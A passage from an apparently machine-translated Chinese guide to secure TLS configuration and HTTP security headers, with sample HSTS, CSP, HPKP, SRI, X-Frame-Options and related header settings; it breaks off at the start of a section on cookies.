套件，以便通过现代网络浏览器实现前向保密。为了支持更广泛的客户，您还应该使用 DHE 套件作为 ECDHE 后备。避免 RSA 密钥交换，除非绝对必要。我在2.3节中提出的默认配置只包含提供前向保密的套件。</p><h4 id="1-2-6-使用强的密钥交换算法"><a href="#1-2-6-使用强的密钥交换算法" class="headerlink" title="1.2.6 使用强的密钥交换算法"></a>1.2.6 使用强的密钥交换算法</h4><p>对于密钥交换，公共站点通常可以选择经典的短暂的 Diffie-Hellman密钥交换（DHE）和其椭圆曲线变体 ECDHE。还有其他的密钥交换算法，但是它们通常是以某种方式不安全的。RSA 密钥交换仍然很受欢迎，但不提供前向保密。</p><p>2015 年，一批研究人员发表了对 DHE 的新攻击; 他们的工作被称为Logjam 攻击。[2] 研究人员发现，较低强度的 DH 密钥交换（例如768 位）容易被破坏，一些知名的 1024 位 DH 组可被国家机构破坏。为了安全起见，如果部署 DHE，请至少配置 2048 位的安全性。一些较老的客户端（例如Java 6）可能不支持这种强度。出于性能原因，大多数服务器应该更喜欢 ECDHE，这是更强大和更快。在这种情况下，secp256r1命名曲线（也称为 P-256）是一个很好的选择。</p><h3 id="1-3-减轻已知问题"><a href="#1-3-减轻已知问题" class="headerlink" title="1.3 减轻已知问题"></a>1.3 减轻已知问题</h3><p>近几年来已经发生了几次严重的 SSL 和 TLS 攻击，但是如果您正在运行最新的软件并遵循本指南的建议，那么它们通常不会关心您。（如果没有，我建议您使用 MYSSL 测试您的系统，并从中进行测试）。但是，没有什么是完全安全的，所以为了保持对安全性的了解，这是一个很好的做法。如果供应商补丁可用，请及时提供; 否则，依靠解决方案进行缓解。</p><h3 id="1-4-性能"><a href="#1-4-性能" class="headerlink" title="1.4 性能"></a>1.4 性能</h3><p>安全是我们在本指南中的主要重点，但我们也要注意表现; 一个不符合性能标准的安全服务无疑将被丢弃。通过正确配置，TLS 可以相当快。使用现代协议（例如 HTTP/2），甚至可能比明文通信更快。</p><h4 id="1-4-1-避免过度安全"><a href="#1-4-1-避免过度安全" class="headerlink" title="1.4.1 避免过度安全"></a>1.4.1 避免过度安全</h4><p>用于建立安全连接的密码握手是一种操作，其费用受私钥大小的高度影响。使用太短的密钥是不安全的，但使用太长的密钥将导致“太多”的安全性和缓慢的操作。对于大多数网站，使用超过 2048 位的 RSA 密钥和强大于 256 位的 ECDSA 密钥会浪费 CPU 功耗，并可能会损害用户体验。类似地，增加短暂密钥交换的强度对于 DHE 为 2048 位以及 ECDHE 为 256 位几乎没有什么好处。使用高于 128 位的加密没有明显的好处。</p><h4 id="1-4-2-使用-session-恢复"><a href="#1-4-2-使用-session-恢复" class="headerlink" title="1.4.2 使用 session 恢复"></a>1.4.2 使用 session 恢复</h4><p>会话恢复是一种性能优化技术，可以节省昂贵的密码操作的结果，并重复使用一段时间。残疾或非功能性会话恢复机制可能会引起显着的性能损失。</p><h4 id="1-4-3-使用-WAN-优化和-HTTP-2"><a href="#1-4-3-使用-WAN-优化和-HTTP-2" class="headerlink" title="1.4.3 使用 WAN 优化和 HTTP/2"></a>1.4.3 使用 WAN 优化和 HTTP/2</h4><p>这些天，TLS 开销不是来自 CPU 饥饿的加密操作，而是来自网络延迟。只有在 TCP 握手完成后才能启动TLS握手，需要进一步交换数据包，并且离开服务器的距离更远。最小化延迟的最佳方法是避免创建新的连接 - 换句话说，保持现有的连接长时间（keep-alives）。提供良好结果的其他技术包括支持现代协议（如HTTP / 2）和使用WAN优化（通常通过内容传送网络）。</p><h4 id="1-4-4-隐藏公共内容"><a href="#1-4-4-隐藏公共内容" class="headerlink" title="1.4.4 隐藏公共内容"></a>1.4.4 隐藏公共内容</h4><p>通过TLS进行通信时，浏览器可能会认为所有流量都是敏感的。它们通常会使用内存来缓存某些资源，但一旦关闭浏览器，所有内容可能会丢失。为了获得性能提升，并能够长期缓存一些资源，将公共资源（例如图像）标记为公开。</p><h4 id="1-4-5-使用-OCSP-Stapling"><a href="#1-4-5-使用-OCSP-Stapling" class="headerlink" title="1.4.5 使用 OCSP Stapling"></a>1.4.5 使用 OCSP Stapling</h4><p>OCSP 装订是 OCSP 协议的扩展，可以直接从服务器提供撤销信息作为 TLS 握手的一部分。因此，客户端不需要联系 OCSP 服务器进行带外验证，并且总体 TLS 连接时间显着减少。OCSP 装订是一种重要的优化技术，但您应该注意，并不是所有的网络服务器都提供了可靠的 OCSP 装订实现。结合具有缓慢或不可靠的 OCSP 响应者的 CA，这样的 Web 服务器可能会产生性能问题。为了获得最佳效果，请模拟故障条件，看看它们是否会影响您的可用性。</p><h4 id="1-4-6-使用快速加密"><a href="#1-4-6-使用快速加密" class="headerlink" title="1.4.6 使用快速加密"></a>1.4.6 使用快速加密</h4><p>除了提供最佳的安全性，我推荐的密码套件配置也提供了最好的性能。尽可能使用支持硬件加速 AES 的 CPU。之后，如果您真的想要进一步的性能优势（大多数网站可能不需要），请考虑使用 ECDSA 密钥。</p><h3 id="1-5-HTTP-和-应用安全"><a href="#1-5-HTTP-和-应用安全" class="headerlink" title="1.5 HTTP 和 应用安全"></a>1.5 HTTP 和 应用安全</h3><p>HTTP 协议和 Web 应用交付的周边平台在 SSL 诞生后继续快速发展。作为这一进化的结果，该平台现在包含可用于打败加密的功能。在本节中，我们列出了这些功能，以及安全使用它们的方法。</p><h4 id="1-5-1-加密无处不在"><a href="#1-5-1-加密无处不在" class="headerlink" title="1.5.1 加密无处不在"></a>1.5.1 加密无处不在</h4><p>加密是可选的事实可能是今天最大的安全问题之一。我们看到以下问题：</p><ul><li>没有 TLS 需要它的网站</li><li>具有 TLS 但不执行 TLS 的站点</li><li>混合 TLS 和非 TLS 内容的网站，有时甚至在同一网页内</li><li>编程错误的网站会颠覆 TLS</li></ul><p>尽管如果您确切了解您正在做的事情，许多这些问题可以被缓解，可靠地保护网站通信的唯一方法是无一例外地执行加密。</p><h4 id="1-5-2-消除混合内容"><a href="#1-5-2-消除混合内容" class="headerlink" title="1.5.2 消除混合内容"></a>1.5.2 消除混合内容</h4><p>混合内容页面是通过 TLS 传输但是包含不通过 TLS 传输的资源（例如，JavaScript 文件，images，CSS 文件）的页面。这样的页面不安全。一个活跃的中间人（MITM）攻击者可以搭载一个单独的未受保护的 JavaScript 资源，例如劫持整个用户会话。即使您遵循上一节的建议并对整个网站加密，您仍然可能会最终从第三方网站中检索未加密的一些资源。</p><h4 id="1-5-3-使用可信第三方"><a href="#1-5-3-使用可信第三方" class="headerlink" title="1.5.3 使用可信第三方"></a>1.5.3 使用可信第三方</h4><p>网站通常使用通过从另一个服务器下载的 JavaScript 代码激活的第三方服务。这种服务的一个很好的例子是 Google Analytics（分析），用于 Web 的大部分。这种包含第三方代码创建一个隐含的信任连接，有效地使对方完全控制您的网站。第三方可能不是恶意的，但是这些服务的大型提供商越来越被视为目标。推理很简单：如果大型提供程序受到威胁，攻击者将被自动访问所有依赖该服务的站点。</p><p>如果您遵循第4.2节的建议，至少您的第三方链接将被加密，从而避免 MITM 攻击。但是，您应该进一步了解：了解您使用的服务和删除服务，将其替换为更安全的替代方案，或接受其继续使用的风险。一种称为子资源完整性（SRI）的新技术可用于通过第三方资源来减少潜在的风险。[3]</p><h4 id="1-5-4-安全-cookie"><a href="#1-5-4-安全-cookie" class="headerlink" title="1.5.4 安全 cookie"></a>1.5.4 安全 cookie</h4><p>要正确安全，网站需要 TLS，而且所有的 Cookie 在创建时都被明确标记为安全的。未能保护 cookies 可以让活跃的 MITM 攻击者通过聪明的技巧来挑逗一些信息，即使在 100％ 加密的网站上也是如此。为了获得最佳效果，请考虑为您的 Cookie 添加加密完整性验证或甚至加密。</p><h4 id="1-5-5-安全-HTTP-压缩"><a href="#1-5-5-安全-HTTP-压缩" class="headerlink" title="1.5.5 安全 HTTP 压缩"></a>1.5.5 安全 HTTP 压缩</h4><p>2012 年 CRIME 攻击显示 TLS 压缩无法安全实施。唯一的解决方案是完全禁用 TLS 压缩。次年，随后再发生两次攻击。TIME 和 BREACH 专注于使用 HTTP 压缩压缩的 HTTP 响应实体中的秘密。与 TLS 压缩不同，HTTP 压缩是必需的，不能关闭。因此，为了解决这些攻击，需要对应用程序代码进行更改。[4]</p><p>TIME 和 BREACH 攻击并不容易实现，但是如果某人有足够的动力使用它们，则这种影响大致相当于成功的跨站点请求伪造（CSRF）攻击。</p><h4 id="1-5-6-部署-HSTS"><a href="#1-5-6-部署-HSTS" class="headerlink" title="1.5.6 部署 HSTS"></a>1.5.6 部署 HSTS</h4><p>HTTP 严格传输安全（HSTS）是 TLS 的安全网。它旨在确保即使在配置问题和实施错误的情况下，安全性仍然保持不变。要激活 HSTS 保护，您可以向您的网站添加一个新的响应头。之后，支持 HSTS（此时所有现代浏览器）的浏览器执行它。</p><p>HSTS 的目标很简单：激活后，它不允许与使用它的网站进行任何不安全的通信。通过自动将所有明文链接转换为安全的链接，实现了这一目标。作为奖励，它还会禁用点击式证书警告。（证书警告是活动的 MITM 攻击的指标，研究表明大多数用户点击这些警告，所以绝对不要让他们感兴趣）。</p><p>添加对 HSTS 的支持是您可以为您的网站的 TLS 安全性做出的最重要的改进。新站点始终应设计为 HSTS，旧站点转换为尽可能快地支持。为了获得最佳安全性，请考虑使用 HSTS 预加载[5]，将HSTS配置嵌入到现代浏览器中，从而使您的网站的第一个连接安全。</p><p>以下配置示例将在主主机名及其所有子域上激活一段时间为一年的 HSTS，同时还允许预加载：<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Strict-Transport-Security: <span class="built_in">max</span>-age=<span class="number">31536000</span>; includeSubDomains; <span class="built_in">preload</span></span><br></pre></td></tr></table></figure></p><h4 id="1-5-7-部署-CSP"><a href="#1-5-7-部署-CSP" class="headerlink" title="1.5.7 部署 CSP"></a>1.5.7 部署 CSP</h4><p>内容安全策略（CSP）是网站可以用来限制浏览器操作的安全机制。尽管最初旨在解决跨站点脚本（XSS），CSP 不断发展，并支持对增强TLS安全性有用的功能。特别地，它可以用于限制混合内容，当涉及到第三方网站，HSTS没有帮助。</p><p>要部署CSP以防止第三方混合内容，请使用以下配置：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-<span class="string">Policy:</span> <span class="keyword">default</span>-src <span class="string">https:</span> <span class="string">'unsafe-inline'</span> <span class="string">'unsafe-eval'</span>;</span><br><span class="line">                         connect-src <span class="string">https:</span> <span class="string">wss:</span></span><br></pre></td></tr></table></figure></p><blockquote><p>注意<br><br>这不是部署 CSP 的最佳方法。为了提供不破坏混合内容以外的任何内容的示例，我不得不禁用某些默认安全功能。随着时间的推移，当您了解 CSP 的更多信息时，您应该更改您的策略以使其恢复。</p></blockquote><h4 id="1-5-8-不要缓存敏感内容"><a href="#1-5-8-不要缓存敏感内容" class="headerlink" title="1.5.8 不要缓存敏感内容"></a>1.5.8 不要缓存敏感内容</h4><p>所有敏感内容必须仅传达给预定方，并由所有设备进行相应处理。虽然代理没有看到加密的流量，并且不能在用户之间共享内容，但是使用基于云的应用交付平台正在增加，这就是为什么在指定什么是公共的时候需要非常小心的是什么。</p><h4 id="1-5-9-考虑其它威胁"><a href="#1-5-9-考虑其它威胁" class="headerlink" title="1.5.9 考虑其它威胁"></a>1.5.9 考虑其它威胁</h4><p>TLS 旨在仅解决安全机密和您与用户之间通信的完整性的一个方面，但还有许多其他威胁需要处理。在大多数情况下，这意味着确保您的网站没有其他弱点。</p><h3 id="1-6-验证"><a href="#1-6-验证" class="headerlink" title="1.6 验证"></a>1.6 验证</h3><p>有许多配置参数可用于调整，预先知道某些变化会产生什么影响。此外，有时会意外地进行更改; 软件升级可以静默地引入更改。因此，我们建议您最初使用全面的 SSL/TLS 评估工具来验证您的配置，以确保您开始安全，然后定期确保您保持安全。对于公共网站，我们建议您免费使用SSL实验室服务器测试。[6]</p><h4 id="1-6-1-高级主题"><a href="#1-6-1-高级主题" class="headerlink" title="1.6.1 高级主题"></a>1.6.1 高级主题</h4><p>以下高级主题目前不在我们的指南范围之内。他们需要更深入地了解 SSL/TLS 和公钥基础设施（PKI），而且他们仍然被专家辩论。</p><h4 id="1-6-2-使用-HPKP"><a href="#1-6-2-使用-HPKP" class="headerlink" title="1.6.2 使用 HPKP"></a>1.6.2 使用 HPKP</h4><p>公共密钥固定旨在使网站运营商有权限制哪些 CA 可以为其网站颁发证书。Google 已经部署了这个功能了一段时间（硬编码到他们的浏览器，Chrome），并且已被证明是非常有用的，以防止攻击并使公众了解它们。在 2014 年，Firefox 还增加了对硬编码固定的支持。现在可以使用一种称为 HTTP [7]的公钥固定扩展标准。公钥绑定解决了 PKI 最大的弱点（事实上，任何 CA 都可以为任何网站发布证书），但是这是一个成本; 部署需要大量精力和专业知识，并造成失去对您站点控制的风险（如果最终导致无效的固定配置）。你应该考虑固定很大程度上只有当你</p><h4 id="1-6-2-使用-DNSSEC-和-DANE"><a href="#1-6-2-使用-DNSSEC-和-DANE" class="headerlink" title="1.6.2 使用 DNSSEC 和 DANE"></a>1.6.2 使用 DNSSEC 和 DANE</h4><p>域名系统安全扩展（DNSSEC）是一种增加域名系统完整性的技术。今天，一个活跃的网络攻击者可以轻松地劫持任何 DNS 请求并伪造任意的响应。使用 DNSSEC，所有响应都可以加密地跟踪到 DNS 根目录。命名实体的基于 DNS 的身份验证（DANE）是建立在 DNSSEC 之上的单独标准，用于提供 DNS 和 TLS 之间的绑定。DANE 可用于增强现有基于 CA 的 PKI 生态系统的安全性，或者完全绕过它。</p><p>即使不是每个人都同意，DNSSEC 是互联网的一个很好的方向，但对其的支持仍在继续改善。浏览器还不支持 DNSSEC 或 DANE（更喜欢 HSTS 和 HPKP 提供的类似功能），但有一些迹象表明它们正在开始用于提高电子邮件传递的安全性。</p><h2 id="0x02-安全加固"><a href="#0x02-安全加固" class="headerlink" title="0x02 安全加固"></a>0x02 安全加固</h2><p>当你的网站上了 HTTPS 以后，可否觉得网站已经安全了？这里 提供了一个 HTTPS 是否安全的检测工具，你可以试试。</p><p>在线检测工具-<a href="https://myssl.com/" target="_blank" rel="noopener">https://myssl.com/</a></p><p>本篇正文讲述的是 HTTP 安全的最佳实践，着重在于 HTTPS 网站的 Header 的相关配置。</p><h3 id="2-1-连接安全性和加密"><a href="#2-1-连接安全性和加密" class="headerlink" title="2.1 连接安全性和加密"></a>2.1 连接安全性和加密</h3><h4 id="2-1-1-SSL-TLS"><a href="#2-1-1-SSL-TLS" class="headerlink" title="2.1.1 SSL/TLS"></a>2.1.1 SSL/TLS</h4><p>传输层安全（TLS）及其前身安全套接字层（SSL），通过在浏览器和 web 服务器之间提供端到端加密来促进机密通信。没有 TLS，就谈不上什么安全。TLS 是 HTTP 安全性的基础。</p><p>想要部署 TLS 是非常容易的，但其难点在于如何使用安全的配置来保障站点的安全。<br>尤其是 Protocol 版本和 Cipher 需要小心选择和配置。你可以通过<a href="https://myssl.com/" target="_blank" rel="noopener">https://myssl.com/</a>体检你的网站，发现并解决这些细节的问题。</p><blockquote><p>建议<br><br>所有本地和链接的资源需要正确的配置，且要使用 TLS。</p></blockquote><h4 id="2-1-2-HTTP-Strict-Transport-Security-HSTS"><a href="#2-1-2-HTTP-Strict-Transport-Security-HSTS" class="headerlink" title="2.1.2 HTTP Strict Transport Security (HSTS)"></a>2.1.2 HTTP Strict Transport Security (HSTS)</h4><p>指示浏览器只使用 HTTPS 连接到目标服务器。这可以防止一些潜在的中间人攻击，包括 SSL 剥离，会话 cookie 窃取（如果没有被 适当保护）。如果遇到任何与证书相关的错误，它还可以阻止浏览器连接到网站。当浏览器访问一个设置相应 HTTP header 的 HTTPS 网站时，HSTS 将被激活。</p><p>HSTS 有一个固定期限，由 max-age 字段值控制。这个值可以是静态的，也可以是相对于将来某个特定日期的，你可以设置成 SSL 证书的过期时间。</p><p>在浏览器中，HSTS 首选项可以通过提交到 <a href="https://hstspreload.appspot.com" target="_blank" rel="noopener">Chromium’s HSTS preload list</a> 来硬编码，这是所有实现 HSTS 使用的浏览器。</p><p>注意，HSTS 确实有陷阱。它提供了 <code>include subdomains</code> 选项，这在实践中可能是太宽泛了。此外，客户端错误可能会造成严重的后果——客户端错误的时钟导致它认为服务器的 SSL 证书无效或过期，或者缺少根 CA 证书——将不再导致浏览器中的证书错误。浏览器将完全拒绝访问页面，并且可能会显示让安全专家之外的完全无法理解的错误。</p><blockquote><p>建议<br><br>设置 HSTS header 长的生命周期，最好是半年及以上。<br><figure class="highlight monkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">Strict</span>-Transport-Security: <span class="built_in">max</span>-age=<span class="number">31536000</span></span><br></pre></td></tr></table></figure></p></blockquote><h4 id="2-1-3-Public-Key-Pins"><a href="#2-1-3-Public-Key-Pins" class="headerlink" title="2.1.3 Public Key Pins"></a>2.1.3 Public Key Pins</h4><p>HTTP PKP（HPKP）指示浏览器只与提供的 SSL/TLS 的 HASH 相符或存在于同一证书链的服务器相连接。换句话说，如果 SSL/TLS 证书以一种意想不到的方式发生了变化，浏览器就无法连接到主机。这主要是针对受信任证书颁发机构（CA）或流氓 CA 证书颁发的伪造证书，用户可能会被骗安装。</p><p>例如，浏览器连接到 <a href="https://example.com，它存在这个头。header" target="_blank" rel="noopener">https://example.com，它存在这个头。header</a> 告诉浏览器，如果证书 key 匹配，或者在发出证书链中有一个 key 匹配，那么在将来才会再次连接。其他的指令组合是可能的。它们都极大地减少了攻击者在客户端和合法主机之间模拟主机或拦截通信的可能性。</p><p>像 HSTS 一样，HPKP 在实现之前需要仔细的思考和计划。错误可以将用户锁定在您的站点之外，并且不容易修复。</p><p>像 HSTS 一样，HPKP 在实现之前需要仔细的思考和计划。错误可以将用户锁定在您的站点之外，并且不容易修复。</p><blockquote><p>建议<br><br>确定是否需要为您的站点使用 PKP。如果是这样的话，那么从一个较小的实践开始，如果在一段时间之后没有遇到问题，就增加它。如果 SSL/TLS 密钥需要更新，建立备份计划。优先创建备份密钥和离线存储。</p></blockquote><p>示例HTTP头:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Public-Key-Pins: <span class="attribute">max-age</span>=5184000; <span class="attribute">pin-sha256</span>=<span class="string">"+oZq/vo3Kcv0CQPjpdwyInqVXmLiobmUJ3FaDpD/U6c="</span>; <span class="attribute">pin-sha256</span>=<span class="string">"47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU="</span></span><br></pre></td></tr></table></figure></p><h4 id="2-1-4-Mixed-HTTPS-and-HTTP-Content"><a href="#2-1-4-Mixed-HTTPS-and-HTTP-Content" class="headerlink" title="2.1.4 Mixed HTTPS and HTTP Content"></a>2.1.4 Mixed HTTPS and HTTP Content</h4><p>主站点通过 HTTPS 安全地服务，但是在 HTTP 上加载一些文件（images、js、css）。这是一个巨大的安全漏洞，破坏了 HTTPS 提供的安全性。受影响的站点可能会泄漏会话 cookie 或用户行为信息。它们也可能容易受到注入和其他 MITM 攻击的攻击，而 HTTPS 通常会阻止这种攻击。</p><blockquote><p>建议<br><br>如果 HTTPS 部署在主站上，请将任何地方的所有内容都 HTTPS 化（全站 HTTPS）。</p></blockquote><h3 id="2-2-Content-security"><a href="#2-2-Content-security" class="headerlink" title="2.2 Content security"></a>2.2 Content security</h3><h4 id="2-2-1-Content-Security-Policy"><a href="#2-2-1-Content-Security-Policy" class="headerlink" title="2.2.1 Content Security Policy"></a>2.2.1 Content Security Policy</h4><p>为浏览器提供关于网站内容类型和行为的明确说明。良好的内容安全策略（CSP）可以帮助抵御跨站点脚本（XSS）和其他注入攻击等攻击。CSP 支持所有主要的浏览器，尽管只是部分地之前在 IE 11。</p><p>一个好的 CSP 是基于白名单的方法，不允许任何东西，除了明确允许的内容。它还限制了 javascript 的来源和允许操作。</p><p>CSP 很难启用遗留代码库。为了简化实现，CSP 提供了一个 <code>report-only</code> 模式，在浏览器中，CSP 的违规被发送到一个网站端点，但是该策略没有被强制执行。<br>新项目应该从一开始就使用 CSP。</p><blockquote><p>建议<br><br>从限制性政策开始，在必要时放松。禁止所有的例子:<br><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: <span class="keyword">default-src</span> <span class="string">'none'</span>;</span><br></pre></td></tr></table></figure></p></blockquote><p>现在让我们允许自托管 scripts、images、CSS、fonts 和 AJAX，以及 jQuery CDN 托管脚本和 Google Analytics:<br><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: <span class="keyword">default-src</span> <span class="string">'none'</span>; <span class="keyword">script-src</span> <span class="string">'self'</span> https://code.jquery.com https://www.google-analytics.com; <span class="keyword">img-src</span> <span class="string">'self'</span> https://www.google-analytics.com; <span class="keyword">connect-src</span> <span class="string">'self'</span>; <span class="keyword">font-src</span> <span class="string">'self'</span>; <span class="keyword">style-src</span> <span class="string">'self'</span>;</span><br></pre></td></tr></table></figure></p><p>要注意的是，不要让所有的东西都破坏你的网站，例如，如果你使用 <code>child-src</code> 指令，而浏览器不支持它。一个不那么严格的政策可能从以下开始:<br><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: <span class="keyword">default-src</span> <span class="string">'self'</span>;</span><br></pre></td></tr></table></figure></p><p>甚至更少的限制性政策甚至可以使用<code>default-src &#39;*&#39;</code>，然后添加限制。我建议你不要这么做，除非你完全明白其中的含义。否则，你可能会依赖 CSP，它只会给你一种错误的安全感。</p><h4 id="2-2-2-Frame-Options"><a href="#2-2-2-Frame-Options" class="headerlink" title="2.2.2 Frame Options"></a>2.2.2 Frame Options</h4><p>控制站点是否可以放置在 <code>&lt;iframe&gt;</code>，<code>&lt;frame&gt;</code> 或 <code>&lt;object&gt;</code> 标签。不允许使用框架可以防止 clickjacking 攻击。例如，从 2015 年 2 月起，<a href="https://thehackernews.com/2015/02/internet-explorer-xss.html" target="_blank" rel="noopener">Internet Explorer’s universal cross-site-scripting bug</a> 就被这个消息头减轻了。</p><p><code>X-Frame-Options</code> 是一个非标准的 header，在内容安全策略级别 2 中被 frame ancestor 指令所取代。然而，frame ancestor 还没有得到普遍的支持，而 <code>X-Frame-Options</code> 得到了广泛的支持。</p><blockquote><p>建议<br><br>确定你的网站是否需要被允许呈现在一个 frame 中。完全不允许使用 sameorigin 拒绝或允许同源框架的选项。避免由于受限或 bug 浏览器支持而允许的选项。示例 HTTP 头:<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-<span class="keyword">Frame</span>-<span class="keyword">Options</span>: deny</span><br></pre></td></tr></table></figure></p></blockquote><h4 id="2-2-3-XSS-Protection"><a href="#2-2-3-XSS-Protection" class="headerlink" title="2.2.3 XSS Protection"></a>2.2.3 XSS Protection</h4><p>跨站点脚本（XSS 或 CSS）的保护被构建到大多数流行的浏览器中，除了 Firefox 之外。这种保护是用户可配置的，可以关闭。因此，明确要求浏览器在你的网站上使用它的 XSS 过滤器是个好主意。</p><p>相反，网站可以要求 XSS 保护在页面的基础上被禁用。这绝对不是一个好主意。</p><blockquote><p>建议<br><br>使用入校 HTTP header:<br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Xss-Protection: <span class="number">1</span>; block</span><br></pre></td></tr></table></figure></p></blockquote><h4 id="2-2-4-Cache-Control"><a href="#2-2-4-Cache-Control" class="headerlink" title="2.2.4 Cache Control"></a>2.2.4 Cache Control</h4><p>表示缓存页面输出的首选项。适当的值随网站数据的性质而变化，但强烈推荐使用偏好。否则，它取决于浏览器和代理来选择是否缓存内容。不恰当的选择可能会导致性能问题、安全问题，或者两者都有。</p><blockquote><p>建议<br><br>开发缓存策略，然后将缓存首选项包括为 HTTP 头。<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cache-<span class="string">Control:</span> <span class="keyword">public</span>*</span><br></pre></td></tr></table></figure></p></blockquote><p>其中的一个 public，private，no-cache 或 no-store。如果允许缓存，则应该将 max-age 值包含在 Cache-Control 以及 Etag 头文件中，以允许客户端缓存验证。</p><h4 id="2-2-5-Content-Type-Options"><a href="#2-2-5-Content-Type-Options" class="headerlink" title="2.2.5 Content Type Options"></a>2.2.5 Content Type Options</h4><p>当浏览器以不同的方式处理来自服务器的文件时，MIME 嗅探就是服务器指令。当一个网站承载不受信任的内容（如用户提供的）时，这是很危险的。假设服务器允许用户上传 image。如果用户上传 HTML 文档，浏览器可能会将其呈现为 web 执行 scriptpage，即使服务器明确表示正在发送 image。非标准的标头 <code>X-Content-Type-Options</code> 选项指示浏览器不做任何模仿指定类型的 MIME。</p><blockquote><p>建议<br><br>总是设置 header:<br><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Content-<span class="keyword">Type</span>-<span class="keyword">Options</span>: nosniff</span><br></pre></td></tr></table></figure></p></blockquote><h4 id="2-2-6-Subresource-Integrity"><a href="#2-2-6-Subresource-Integrity" class="headerlink" title="2.2.6 Subresource Integrity"></a>2.2.6 Subresource Integrity</h4><p>浏览器通常从外部域加载大量资源、javascript 和样式表。内容交付网络经常被使用。如果外部资源被破坏，依赖站点的安全性也可以。子资源完整性允许浏览器验证 javascript 或样式表未被意外修改。</p><blockquote><p>建议<br><br>设置外部 javascript 和样式表的完整性属性。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"</span> integrity=<span class="string">"sha384-6ePHh72Rl3hKio4HiJ841psfsRJveeS+aLoaEf3BWfS+gTF0XdAqku2ka8VddikM"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>注意<br><br>您应该始终提供外部脚本的本地副本，并实现一种方法，以便在外部负载失败的情况下重新加载它们。否则你的网站可能会崩溃。例子:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">window</span>.jQuery || <span class="built_in">document</span>.write(<span class="string">'&lt;script src="/jquery.min.js"&gt;&lt;\/script&gt;'</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p></blockquote><h4 id="2-2-7-Iframe-Sandbox"><a href="#2-2-7-Iframe-Sandbox" class="headerlink" title="2.2.7 Iframe Sandbox"></a>2.2.7 Iframe Sandbox</h4><p>iframe 在 WWW 上随处可见。网站平均有 5.1 iframe，主要用于装载第三方内容。这些 iframe 有很多方法来伤害托管网站，包括运行脚本和插件和重新引导访问者。sandbox 属性允许对 iframe 中可以进行的操作进行限制。</p><blockquote><p>建议<br><br>设置 iframe 的 sandbox 属性，然后添加所需的权限。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">"https://example.com"</span> sandbox=<span class="string">"allow-same-origin allow-scripts"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p></blockquote><h4 id="2-2-8-Server-Clock"><a href="#2-2-8-Server-Clock" class="headerlink" title="2.2.8 Server Clock"></a>2.2.8 Server Clock</h4><p>服务器包括所有响应的时间戳。不准确的时钟不会给客户机浏览器带来问题。然而，当与其他系统或服务交互时，问题就会出现。</p><blockquote><p>建议<br><br>使用网络时间协议（NTP）来保持服务器时钟的准确性。</p></blockquote><h3 id="2-3-Information-disclosure"><a href="#2-3-Information-disclosure" class="headerlink" title="2.3 Information disclosure"></a>2.3 Information disclosure</h3><h4 id="2-3-1-Server-Banner"><a href="#2-3-1-Server-Banner" class="headerlink" title="2.3.1 Server Banner"></a>2.3.1 Server Banner</h4><p>大多数 web 服务器设置报头来识别自己和他们的版本号。这只服务于信息目的和实际用途是非常有限的。去掉整个头，而完全可以接受，通常是不必要的。但是，建议从头中删除版本号。在特定 web 服务器版本中存在 bug 的情况下，包括版本号可以作为对脚本 kiddy 的邀请来尝试对服务器的攻击。</p><blockquote><p>建议<br><br>包含服务器名称但去掉版本号；<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Server</span>: nginx</span><br></pre></td></tr></table></figure></p></blockquote><h4 id="2-3-2-Web-Framework-Information"><a href="#2-3-2-Web-Framework-Information" class="headerlink" title="2.3.2 Web Framework Information"></a>2.3.2 Web Framework Information</h4><p>许多 web 框架设置 HTTP 头，识别框架或版本号。除了满足用户的好奇心，而且主要作为技术堆栈的广告，这几乎没有什么作用。这些头是不标准的，对浏览器渲染站点的方式没有影响。</p><p>虽然它们没有什么实际用途，但对于搜索运行过时版本的软件的机器人或蜘蛛来说，这些标头是无价的，因为这些软件可能包含安全漏洞。如果没有定期更新，这些头文件可以使网站的目标变得容易。</p><blockquote><p>建议<br><br>从服务器响应中删除这些标头: <code>X-Powered-By</code>, <code>X-Runtime</code>, <code>X-Version</code> 和 <code>X-AspNet-Version</code>。</p></blockquote><h3 id="2-4-Cookies"><a href="#2-4-Cookies" class="headerlink" title="2.4 Cookies"></a>2.4 Cookies</h3><h4 id="2-4-1-Cookie-Security"><a 